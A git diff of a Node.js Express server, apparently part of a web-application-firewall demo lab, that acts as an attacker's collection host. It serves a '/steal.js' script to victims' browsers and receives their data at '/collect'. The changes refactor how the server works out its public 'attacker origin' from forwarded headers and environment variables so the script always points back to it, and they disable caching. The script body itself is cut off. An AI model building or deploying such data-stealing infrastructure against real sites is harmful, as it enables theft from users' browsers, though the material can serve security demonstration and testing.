@@ -1,5 +1,4 @@
 const express = require('express');
-const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3001;
@@ -23,23 +22,17 @@ function forwardedHost(req) {
   return raw.split(',')[0].trim();
 }
 
-/** Public origin browsers use when calling /collect (matches WAF proto + Host). */
-function getPublicAttackerOrigin(req) {
-  const legacy = (process.env.ATTACKER_URL || '').trim();
-  if (legacy) {
-    const href = /^https?:\/\//i.test(legacy) ? legacy : `http://${legacy}`;
-    try {
-      const u = new URL(href.replace(/\/$/, ''));
-      return `${u.protocol}//${u.host}`;
-    } catch (_) {
-      return legacy.replace(/\/$/, '');
-    }
+function normalizeLegacyOrigin(legacy) {
+  const href = /^https?:\/\//i.test(legacy) ? legacy : `http://${legacy}`;
+  try {
+    const u = new URL(href.replace(/\/$/, ''));
+    return `${u.protocol}//${u.host}`;
+  } catch (_) {
+    return legacy.replace(/\/$/, '');
   }
-  const proto = forwardedProto(req);
-  let host =
-    forwardedHost(req) ||
-    (process.env.ATTACKER_DOMAIN || '').trim();
-  if (!host) return `${proto}://127.0.0.1:${PORT}`;
+}
+
+function buildOriginWithOptionalPort(proto, host) {
   let origin = `${proto}://${host}`;
   const pubPort = (
     process.env.ATTACKER_PUBLIC_PORT ||
@@ -50,6 +43,32 @@ function getPublicAttackerOrigin(req) {
     origin += `:${pubPort}`;
   }
   return origin;
+}
+
+/**
+ * Browsers load /steal.js from the public attacker host; prefer that Host + forwarded
+ * proto over ATTACKER_URL so WAF / multi-domain deploys are not stuck on a stale env URL.
+ * Set FORCE_ATTACKER_URL_FROM_ENV=1 to always bake ATTACKER_URL into the script.
+ */
+function getPublicAttackerOrigin(req) {
+  const legacy = (process.env.ATTACKER_URL || '').trim();
+  const forceEnv = (process.env.FORCE_ATTACKER_URL_FROM_ENV || '') === '1';
+  if (forceEnv && legacy) {
+    return normalizeLegacyOrigin(legacy);
+  }
+
+  const proto = forwardedProto(req);
+  const host =
+    forwardedHost(req) ||
+    (process.env.ATTACKER_DOMAIN || '').trim();
+  if (host) {
+    return buildOriginWithOptionalPort(proto, host);
+  }
+
+  if (legacy) {
+    return normalizeLegacyOrigin(legacy);
+  }
+  return `${proto}://127.0.0.1:${PORT}`;
 }
 
 const DEFAULT_ORIGIN_SUFFIXES = ['fortinet.demo', 'packetsoprano.com'];
@@ -127,6 +146,7 @@ app.use(express.urlencoded({ extended: true }));
 app.get('/steal.js', (req, res) => {
   const baseUrl = getPublicAttackerOrigin(req);
   res.setHeader('Content-Type', 'application/javascript');
+  res.setHeader('Cache-Control', 'no-store');
   res.send(`
 (function() {
   var target = ${JSON.stringify(baseUrl)};
